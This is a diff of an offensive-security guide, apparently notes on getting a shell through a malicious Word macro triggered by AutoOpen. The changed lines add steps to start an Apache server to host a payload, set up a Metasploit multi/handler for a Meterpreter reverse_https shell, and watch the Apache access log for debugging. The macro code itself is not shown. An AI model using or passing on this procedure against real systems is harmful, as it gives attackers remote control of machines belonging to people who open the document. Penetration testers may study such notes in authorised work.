@@ -104,7 +104,7 @@ Sub AutoOpen()
 End Sub
 ```
 
-**try to use the one on top instead of this** Add this to a Microsoft Word Macro `AutoOpen()`:
+**(Try to use the one on top instead of this)** Add this to a Microsoft Word Macro `AutoOpen()`:
 
 ```vb
 Sub MyMacro()
@@ -125,10 +125,18 @@ End Sub
 Finally prepare for incoming shell **(remember to change to 32-bit if required)**:
 
 ```
+sudo systemctl start apache2
 msfconsole -q
 use multi/handler
 set payload windows/x64/meterpreter/reverse_https
 set lhost IP
 set lport PORT
 exploit
+```
+
+
+To debug use
+
+```
+sudo tail /var/log/apache2/access.log
 ```
